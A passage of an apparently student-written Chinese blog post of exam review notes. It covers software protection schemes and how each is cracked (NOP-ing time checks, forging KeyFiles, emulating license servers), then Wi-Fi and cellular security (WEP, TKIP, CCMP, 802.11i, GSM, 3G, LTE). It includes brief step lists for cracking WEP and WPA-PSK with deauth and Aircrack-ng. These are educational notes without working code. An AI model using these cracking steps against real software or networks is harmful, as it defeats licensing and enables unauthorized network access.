<h4 id="时间限制保护方式"><a href="#时间限制保护方式" class="headerlink" title="时间限制保护方式"></a>时间限制保护方式</h4><p><strong>保护方法：</strong>限制每次运行时长（计时器机制），限制总运行时长（如试用期）</p>
<p><strong>破解方法：</strong></p>
<ul>
<li>跳过相关函数</li>
<li>将时间检测后的跳转语句<code>NOP</code>掉</li>
</ul>
<h4 id="菜单功能限制"><a href="#菜单功能限制" class="headerlink" title="菜单功能限制"></a>菜单功能限制</h4><p><strong>保护方法：</strong>Demo版本，部分功能灰色无法使用，</p>
<ul>
<li>试用版和正式版完全相同</li>
<li>试用版和正式版2个版本，无法破解</li>
</ul>
<p><strong>破解方法：</strong></p>
<ul>
<li>将限制灰色不可用更改设置为可操作</li>
<li>找到限制函数，跳转</li>
</ul>
<pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">EnableMenultem(HMENU hMenu, UINT ulDEnableltem,UIN，uEnable)
EnableWindow(HWND hWnd, BOOL bEnable)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="KeyFile保护方式"><a href="#KeyFile保护方式" class="headerlink" title="KeyFile保护方式"></a>KeyFile保护方式</h4><p><strong>保护方法：</strong></p>
<ul>
<li>利用文件来注册软件的保护方式</li>
<li>KeyFile一般是一个小文件（文本或二进制文件）其内容是一些加密或者未加密的数据，可能包含用户名、注册码等信息</li>
<li>试用版软件没有该文件</li>
<li>该文件一般放在软件的安装目录或系统目录下，软件每次启动时，从该文件读取数据，利用某种算法进行处理，根据处理结果判断是否为正确的注册文件</li>
<li>相关的API函数：所有与Windows文件操作相关的API，如<br>FindFirstFileA等</li>
</ul>
<p><strong>破解方式：</strong></p>
<ul>
<li>分析KeyFile的文件，伪造虚假的KeyFile文件</li>
<li>用Filemon这一工具，它能实时监视系统各文件的状态，因此运行程序时，如它去读指定文件名的KeyFile时，会在Filemon显示KeyFile文件名。一但您发现KeyFile文件名，就建立一假的KeyFile到要被Crack软件目录下，然后去Crack。</li>
<li>分析代码修改跳转</li>
</ul>
<h4 id="网络验证保护机制"><a href="#网络验证保护机制" class="headerlink" title="网络验证保护机制"></a>网络验证保护机制</h4><p><strong>保护方式：</strong>流行方式之一，将一些关键数据放在服务器上，软件必须从服务器获取数据才能正确运行</p>
<p><strong>破解方法：</strong></p>
<ul>
<li>拦截服务器返回的数据包，分析程序是如何处理数据包的</li>
<li>如果网络验证数据包内容固定，写一个本地服务器来模拟服务器</li>
<li>如果数据包不固定，则必须分析其结构，找出相应的算法</li>
</ul>
<h4 id="只运行一个示例保护方式"><a href="#只运行一个示例保护方式" class="headerlink" title="只运行一个示例保护方式"></a>只运行一个示例保护方式</h4><p><strong>保护方式：</strong></p>
<ul>
<li>查找窗口：运行前查找，限制只运行一个</li>
<li>使用互斥对象</li>
<li>使用共享区块，读写保护</li>
</ul>
<p><strong>破解方法：</strong></p>
<ul>
<li>最简单的办法, 就是创建多个用户, 然后运行的时候右键, 以XXXX运行程序，通常应用程序不会限制全局, 不同用户是可以拥有一个实例的</li>
<li>软件代码修改，破除限制</li>
</ul>
<h2 id="移动安全"><a href="#移动安全" class="headerlink" title="移动安全"></a>移动安全</h2><h3 id="考题"><a href="#考题" class="headerlink" title="考题"></a>考题</h3><blockquote>
<p>这里内容太多没办法一次性搞完，以复习考试为主，面向考试复习</p>
</blockquote>
<p><strong>1. 简述无线局域网的基本组成部分</strong></p>
<p>无线局域网由无线网卡、无线接入点(AP)、计算机和有关设备组成，采用单元结构，将整个系统分成许多单元，每个单元称为一个基本服务集（BSS）。</p>
<ul>
<li>工作站(STA)Station: 网络最基本的组成部分，通常指的就是无线客户端。</li>
<li>基本服务单元（Basic Service Set,BSS）是网络最基本的服务单元,STA采用相同的MAC协议竞争访问</li>
<li>分配系统（Distribution System,DS）。分配系统用于连接不同的基本服务单元</li>
<li>接入点（Access Point,AP）。接入点既有普通站点的身份，又有接入到分配系统的功能。</li>
<li>扩展服务单元（Extended Service Set,ESS）。由分配系统和基本服务单元组合而成。</li>
<li>关口（Portal），也是一个逻辑成分。用于将无线局域网和有线局域网或其它网络联系起来。</li>
<li>每一个无线局域网都有刚服务集标识SSID(包括BSSID和ESSID)区分不同网络，由AP广播</li>
</ul>
<p><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205232137363.webp" alt="img"></p>
<p><strong>2. 常见的无线局域网的安全技术有那些</strong></p>
<ul>
<li>物理地址（ MAC ）过滤、</li>
<li>服务区标识符(SSID)匹配、</li>
<li>有线对等保密（WEP）、</li>
<li>端口访问控制技术（IEEE802.1x）、</li>
<li>WPA (Wi-Fi Protected Access)、</li>
<li>IEEE 802.11i等</li>
</ul>
<p><strong>3. IEEE 802.11协议安全体系</strong></p>
<ol>
<li>TSN(过度安全网络)：支持WEP设备的安全网络</li>
<li>RSN(坚固安全网络)：抛弃了WEP协议，重新设计了无线局域网安全认证过程<ul>
<li>基于802.1x的对AP和STA的双向增强认证机制</li>
<li>具有密钥管理算法</li>
<li>动态会话密钥</li>
<li>加强的加密算法CCMP和TKIP，其中实现基于AES的CCMP</li>
<li>支持快速漫游和预认证</li>
</ul>
</li>
</ol>
<p><strong>4.  简述WEP安全机制的工作流程，并说明其在安全方面的不足</strong></p>
<p>流程：</p>
<ol>
<li>数据校验阶段。对明文（Plaintext）M 求 CRC32 校验值 IVC=C（M），并将其与 M 连接，得到 P=（IVC||M）。</li>
<li>加密密钥生成阶段。选择一个 IV，以 IV||SK 作为伪随机数产生器（PRNG）的种子，生成密钥序列（Key Sequence，KS），即 KS=RC4（EV||SK），这是一个与 P 等长的伪随机序列。</li>
<li>加密阶段。将 KS 与 P 作 XOR（异或）运算即可产生密文 C=KS⊕P。发送时将密文和 IV 一起传输，即传输：IV||C。</li>
</ol>
<p>安全性：</p>
<ul>
<li>RC4存在大量弱密钥：每256个就有一个</li>
<li>WEP没有抗重放机制，无序列号，完整性只保护数据，不保护源和目的地址</li>
<li>SK密钥的产生和分发（没有密钥交换管理机制），容易穷举，字典攻击，容易泄露</li>
<li>IV空间太小，IV目的是避免种子密钥重复，而IV是随机的，实际只需5000个包就会开始重复（生日攻击）</li>
<li>CRC32是线性的, 已知$CRC32(X⊕Y)=CRC32(X)⊕CRC32(Y)$,CRC32在WEP中按如下方式使用：$(PCRC32(P)⊕K=C$,在k未知的情况下，可任意篡改未知明文的密文，且能保证ICV值的正确性</li>
</ul>
<p><strong>5. 简述TKIP安全机制的工作原理</strong></p>
<ol>
<li>TK和TA,TSC经过第一阶段密钥混合生成TTAK、</li>
<li>TTAK,TK,TSC经过第二阶段密钥混合生成WEPseed</li>
<li>利用MIC（Michael算法）计算MSDU对应的消息码MIC</li>
<li>MSDU+NIC进行封装拼接唯一的TSC形成受保护数据包</li>
<li>数据包经过WEP加密得到密文MPDU</li>
</ol>
<p><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205232221174.png" alt="image-20220523222148979"></p>
<p><strong>6. 简述CCMP安全机制的工作原理</strong></p>
<ol>
<li>PN递增</li>
<li>根据MPDU的MAC header构造AAD。</li>
<li>构造Nonce。由PN，A2以及priority构造。A2是MPDU Address 2。</li>
<li>PN和key id放入CCMP header</li>
<li>TK，AAD，nonce，MPDU做CCM算法，得到加密的data和MIC。</li>
<li>MAC header，CCMP header以及加密的data、MIC组装得到CCMP MPDU。</li>
</ol>
<p><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205232240246.png" alt="image-20220523224023097"></p>
<p><strong>7. 简述IEEE802.11I的认证和密钥交换协议的工作原理</strong></p>
<p><strong>认证和密钥交换</strong></p>
<ol>
<li>网络发现</li>
<li>802.11开放系统认证与关联</li>
<li>802.1x EAP认证</li>
<li>四步握手</li>
<li>安全数据通信</li>
</ol>
<p><strong>四步握手：</strong></p>
<ol>
<li>认证者将nonce传给申请者；nonce是防范重放攻击的随机值。信息本身并未经过认证，但并没有被篡改的危险。如果信息遭人更改，磋商就会失败并重新执行</li>
<li>申请者所送出的的信息中包含申请者的nonce以及初次与网络连接所取得的安全参数副本。整个信息系经过（以EAPOL密钥确认密钥计算而来的完整性检验值）的验证。</li>
<li>认证者取出消息中的申请者nonce，依次衍生出完整的密钥层次结构。此时磋商双方的密钥均已就绪，但仍需确认。认证者会将一个信息传给申请者；此信息代表将被加入之成对密钥的序号。它同时包括了目前的群组临时密钥，以便后续能够更新群组密钥。GTK以EAPOL密钥加密密钥来加密，以密钥确认密钥来认证</li>
<li>申请者最后会送出确认信息给认证者，告诉认证者已经接收到配钥信息，可以开始使用这些密钥。此信息系经过密钥确认密钥的认证。</li>
</ol>
<p><strong>8. 简述GSM的安全机制</strong></p>
<p><strong>安全机制</strong></p>
<ul>
<li>用户身份认证和鉴别</li>
<li>通信信息加密</li>
<li>用户身份IMSI保密</li>
</ul>
<p><strong>不足</strong></p>
<ul>
<li>单向认证</li>
<li>空中接口加密</li>
<li>完整性保护缺失</li>
</ul>
<p><strong>9. 简述3G的安全机制</strong></p>
<ul>
<li>增强用户身份保密(EUIC,Enhanced User ldentity Confidentialy):通过归属网及<br>认证中心HLR/AuC对移动用户USIM卡身份信息进行认证。</li>
<li>用户身份保密(UIC,User1 dentity Confidenta):用产与服务网之间的身份认证。</li>
<li>认证和密钥协商(AKA,Authentication&amp;Key Agreement):用于USM卡、VLR/SGSN、HLR间进行的双向认证和密钥分发。</li>
<li>用户及信令数据机密性(DC,Data Confidentiality)):加密UE与RNC间的信息。</li>
<li>消息完整性(DL,Data Integrity:)认证消息的完整性、时效以及消息的来源地与目<br>的地。</li>
</ul>
<p><strong>10. 简述LTE的安全机制</strong></p>
<ul>
<li>4G实现了分层安全，即将接入层(AS)和非接入层NAS)安全分离。</li>
<li>其中接入层安全负责eNodeB和UE之间的安全，包括RRC信令的机密性保护和完整性保护、用户面机密性保护；</li>
<li>非接入层安全负责MME和UE之间的安全，包括NAS信令的机密性保护和完整性保护</li>
<li>继承3G认证和密钥协商</li>
<li>4G中采用更安全加密算法，AES,SNOW和ZUC算法</li>
</ul>
<p><strong>11. 简述2G，3G和LTE网络的安全机制的异同点</strong></p>
<ul>
<li>1G关键点：无线，蜂窝组网</li>
<li>2G关键点：数字，TDMA(时分多址)/FDMA(频分多址)</li>
<li>3G关键点：CDMA，IP化，数据业务</li>
<li>4G关键点：OFDMA(快速傅里叶变换)，MIMO(多入多出)，高速数据业务</li>
<li>5G关键点：Massive MIMO，小蜂窝，D2D，IoT</li>
</ul>
<p><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205232033818.png" alt="image-20220523203359597"></p>
<h3 id="移动无线网络"><a href="#移动无线网络" class="headerlink" title="移动无线网络"></a>移动无线网络</h3><p><strong>分类</strong></p>
<ul>
<li>有线网络</li>
<li>无线网络</li>
</ul>
<p><strong>无线网络分类</strong></p>
<ul>
<li>无线个域网（WPAN）蓝牙，zigbee</li>
<li>无线局域网（WLAN）wifi</li>
<li>无线城域网（WMAN）无线基站，3G</li>
<li>无线广域网（WWAN）卫星，2，3，4，5G</li>
</ul>
<p><strong>风险因素：</strong></p>
<ul>
<li>信道开放性，被窃听攻击</li>
<li>可移动性</li>
<li>可访问性</li>
</ul>
<h3 id="无线局域网安全（WLAN）"><a href="#无线局域网安全（WLAN）" class="headerlink" title="无线局域网安全（WLAN）"></a>无线局域网安全（WLAN）</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p><strong>IEEE 802.11协议安全体系</strong></p>
<ol>
<li>TSN(过度安全网络)：支持WEP设备的安全网络</li>
<li>RSN(坚固安全网络)：抛弃了WEP协议，重新设计了无线局域网安全认证过程<ul>
<li>基于802.1x的对AP和STA的双向增强认证机制</li>
<li>具有密钥管理算法</li>
<li>动态会话密钥</li>
<li>加强的加密算法CCMP和TKIP，其中实现基于AES的CCMP</li>
<li>支持快速漫游和预认证</li>
</ul>
</li>
</ol>
<p><strong>结构：</strong></p>
<p><strong>安全服务：</strong></p>
<ul>
<li>认证服务</li>
<li>访问控制服务</li>
<li>消息加密与完整性服务</li>
</ul>
<p><strong>工作流程：</strong></p>
<ol>
<li>网络发现（工作站&lt;-&gt;接入点）</li>
<li>认证（接入点&lt;-&gt;认证服务器）</li>
<li>密钥管理（工作站&lt;-&gt;接入点）</li>
<li>保护数据传输（工作站&lt;-&gt;接入点）</li>
</ol>
<h4 id="WEP"><a href="#WEP" class="headerlink" title="WEP"></a>WEP</h4><p>WEP（Wired Equivalent Privacy）叫做有线等效加密，是一种可选的链路层安全机制，用来提供访问控制、数据加密和安全性检验等功能，是无线领域第一个安全协议。</p>
<p><strong>流程：</strong></p>
<ol>
<li>数据校验阶段。对明文（Plaintext）M 求 CRC32 校验值 IVC=C（M），并将其与 M 连接，得到 P=（IVC||M）。</li>
<li>加密密钥生成阶段。选择一个 IV，以 IV||SK 作为伪随机数产生器（PRNG）的种子，生成密钥序列（Key Sequence，KS），即 KS=RC4（EV||SK），这是一个与 P 等长的伪随机序列。</li>
<li>加密阶段。将 KS 与 P 作 XOR（异或）运算即可产生密文 C=KS⊕P。发送时将密文和 IV 一起传输，即传输：IV||C。</li>
</ol>
<p><strong>安全性：</strong></p>
<ul>
<li>RC4存在大量弱密钥：每256个就有一个</li>
<li>WEP没有抗重放机制，无序列号，完整性只保护数据，不保护源和目的地址</li>
<li>SK密钥的产生和分发（没有密钥交换管理机制），容易穷举，字典攻击，容易泄露</li>
<li>IV空间太小，IV目的是避免种子密钥重复，而IV是随机的，实际只需5000个包就会开始重复（生日攻击）</li>
<li>CRC32是线性的, 已知$CRC32(X⊕Y)=CRC32(X)⊕CRC32(Y)$,CRC32在WEP中按如下方式使用：$(PCRC32(P)⊕K=C$,在k未知的情况下，可任意篡改未知明文的密文，且能保证ICV值的正确性</li>
</ul>
<p><strong>WEP认证机制：</strong></p>
<ul>
<li>开放系统认证：这种认证方式不需要确认STA的任何信息，它只是和AP进行一个招呼式的交互，这个过程中并没有交互身份信息，所以也可以认为是一个空加密。<ol>
<li>认证请求</li>
<li>认证回复</li>
</ol>
</li>
<li>共享秘钥认证：这种认证方式使用WEP认证STA（明文挑战）<ol>
<li>客户端向AP发送认证请求</li>
<li>AP向客户端发送明文挑战</li>
<li>客户端使用共享WEP密钥加密，并返回AP</li>
<li>AP发送认证响应</li>
</ol>
</li>
<li>其他安全措施<ul>
<li>SSID认证</li>
<li>MAC地址控制</li>
</ul>
</li>
</ul>
<p><strong>WEP破解：</strong></p>
<ol>
<li>激活无线网卡</li>
<li>启动混杂模式</li>
<li>抓取数据包</li>
<li>arp注入攻击</li>
<li>密码破解</li>
</ol>
<h4 id="TKIP"><a href="#TKIP" class="headerlink" title="TKIP"></a>TKIP</h4><p>加密机制TKIP一暂时密钥完整性协议,改进WEP</p>
<p><strong>TKIP的改进：</strong></p>
<ul>
<li>IV:24bit→48bit(非WEP加密的V）</li>
<li>WEP密钥SK:40bit→104bit</li>
<li>引入4个新算法：<ol>
<li>单包密钥(per-packet key)生成算法一防止弱密钥的产生</li>
<li>消息完整性校验码(Message Integrity Code,MIC)一防止数据被非法篡改</li>
<li>具有序列功能的IV一防止重放攻击</li>
<li>可生成新的加密和完整性密钥的Rekeying机制一防止IV重用</li>
</ol>
</li>
</ul>
<p><strong>加密过程：</strong></p>
<ol>
<li>TK和TA,TSC经过第一阶段密钥混合生成TTAK、</li>
<li>TTAK,TK,TSC经过第二阶段密钥混合生成WEPseed</li>
<li>利用MIC（Michael算法）计算MSDU对应的消息码MIC</li>
<li>MSDU+NIC进行封装拼接唯一的TSC形成受保护数据包</li>
<li>数据包经过WEP加密得到密文MPDU</li>
</ol>
<p><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205232221174.png" alt="image-20220523222148979"></p>
<blockquote>
<ol>
<li>TTAK:消除各通信方使用相同密钥的隐患</li>
<li>NEPSeed:别除已知弱密钥</li>
</ol>
</blockquote>
<h4 id="CCMP"><a href="#CCMP" class="headerlink" title="CCMP"></a>CCMP</h4><p>CCMP使用AES块加密算法取代WEP和TKIP的RC4流算法，它也是WAP2指定的加密方式</p>
<p><strong>组成：</strong></p>
<ul>
<li>计算器模式CTR：数据加密</li>
<li>CBC-MAC模式：消息完整性</li>
</ul>
<p><strong>加密过程：</strong></p>
<ol>
<li>PN递增</li>
<li>根据MPDU的MAC header构造AAD。</li>
<li>构造Nonce。由PN，A2以及priority构造。A2是MPDU Address 2。</li>
<li>PN和key id放入CCMP header</li>
<li>TK，AAD，nonce，MPDU做CCM算法，得到加密的data和MIC。</li>
<li>MAC header，CCMP header以及加密的data、MIC组装得到CCMP MPDU。</li>
</ol>
<p><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205232240246.png" alt="image-20220523224023097"></p>
<blockquote>
<p>每一个MPUD都对应一个PN，用来抗重放</p>
</blockquote>
<h4 id="IEEE802-11i协议认证和密钥交换（AKE）"><a href="#IEEE802-11i协议认证和密钥交换（AKE）" class="headerlink" title="IEEE802.11i协议认证和密钥交换（AKE）"></a>IEEE802.11i协议认证和密钥交换（AKE）</h4><p><strong>认证和密钥交换</strong></p>
<ol>
<li>网络发现</li>
<li>802.11开放系统认证与关联</li>
<li>802.1x EAP认证</li>
<li>四步握手</li>
<li>安全数据通信</li>
</ol>
<p><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205232247847.png" alt="image-20220523224710683"></p>
<p><strong>四步握手：</strong></p>
<ol>
<li>认证者将nonce传给申请者；nonce是防范重放攻击的随机值。信息本身并未经过认证，但并没有被篡改的危险。如果信息遭人更改，磋商就会失败并重新执行</li>
<li>申请者所送出的的信息中包含申请者的nonce以及初次与网络连接所取得的安全参数副本。整个信息系经过（以EAPOL密钥确认密钥计算而来的完整性检验值）的验证。</li>
<li>认证者取出消息中的申请者nonce，依次衍生出完整的密钥层次结构。此时磋商双方的密钥均已就绪，但仍需确认。认证者会将一个信息传给申请者；此信息代表将被加入之成对密钥的序号。它同时包括了目前的群组临时密钥，以便后续能够更新群组密钥。GTK以EAPOL密钥加密密钥来加密，以密钥确认密钥来认证</li>
<li>申请者最后会送出确认信息给认证者，告诉认证者已经接收到配钥信息，可以开始使用这些密钥。此信息系经过密钥确认密钥的认证。</li>
</ol>
<p><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205252138079.png" alt="image-20220525213807900"></p>
<p><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205252138145.png" alt="image-20220525213822969"></p>
<p><strong>WPA-PSK/WPA2-PSK的破解:</strong></p>
<ol>
<li>查看并载入无线网卡</li>
<li>激活无线网卡到监听模式</li>
<li>探测并抓包</li>
<li>进行Deauth攻击</li>
<li>打开Aircrack-ng，开始爆破</li>
</ol>
<h3 id="无线广域网安全（WWAM）"><a href="#无线广域网安全（WWAM）" class="headerlink" title="无线广域网安全（WWAM）"></a>无线广域网安全（WWAM）</h3><h4 id="概叙"><a href="#概叙" class="headerlink" title="概叙"></a>概叙</h4><ul>
<li>1G关键点：无线，蜂窝组网</li>
<li>2G关键点：数字，TDMA(时分多址)/FDMA(频分多址)</li>
<li>3G关键点：CDMA，IP化，数据业务</li>
<li>4G关键点：OFDMA(快速傅里叶变换)，MIMO(多入多出)，高速数据业务</li>
<li>5G关键点：Massive MIMO，小蜂窝，D2D，IoT</li>
<li><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205232332648.png" alt="image-20220523203359597"></li>
</ul>
<h4 id="GSM系统安全"><a href="#GSM系统安全" class="headerlink" title="GSM系统安全"></a>GSM系统安全</h4><p><strong>安全机制</strong></p>
<ul>
<li>用户身份认证和鉴别</li>
<li>通信信息加密</li>
<li>用户身份IMSI保密</li>
</ul>
<p><strong>不足</strong></p>
<ul>
<li>单向认证</li>
<li>空中接口加密</li>
<li>完整性保护缺失</li>
</ul>
<h4 id="3G的安全机制"><a href="#3G的安全机制" class="headerlink" title="3G的安全机制"></a>3G的安全机制</h4><p><strong>安全机制</strong></p>
<ul>
<li>增强用户身份保密(EUIC,Enhanced User ldentity Confidentialy):通过归属网及<br>认证中心HLR/AuC对移动用户USIM卡身份信息进行认证。</li>
<li>用户身份保密(UIC,User1 dentity Confidenta):用产与服务网之间的身份认证。</li>
<li>认证和密钥协商(AKA,Authentication&amp;Key Agreement):用于USM卡、VLR/SGSN、HLR间进行的双向认证和密钥分发。</li>
<li>用户及信令数据机密性(DC,Data Confidentiality)):加密UE与RNC间的信息。</li>
<li>消息完整性(DL,Data Integrity:)认证消息的完整性、时效以及消息的来源地与目<br>的地。</li>
</ul>
<h4 id="4G-LTE的安全机制"><a href="#4G-LTE的安全机制" class="headerlink" title="4G/LTE的安全机制"></a>4G/LTE的安全机制</h4><p><strong>安全机制</strong></p>
<ul>
<li>4G实现了分层安全，即将接入层(AS)和非接入层NAS)安全分离。</li>
<li>其中接入层安全负责eNodeB和UE之间的安全，包括RRC信令的机密性保护和完整性保护、用户面机密性保护；</li>
<li>非接入层安全负责MME和UE之间的安全，包括NAS信令的机密性保护和完整性保护</li>
<li>继承3G认证和密钥协商</li>
<li>4G中采用更安全加密算法，AES,SNOW和ZUC算法</li>
</ul>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">LowlyLi</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://lcy5201314.top/2022/05/25/2020-5-25-gong-fang-fu-xi/">http://lcy5201314.top/2022/05/25/2020-5-25-gong-fang-fu-xi/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">LowlyLi</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/CUMT/">
                                    <span class="chip bg-color">CUMT</span>
                                </a>
                            
                                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
                                    <span class="chip bg-color">网络安全</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="qq,wechat,weibo" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
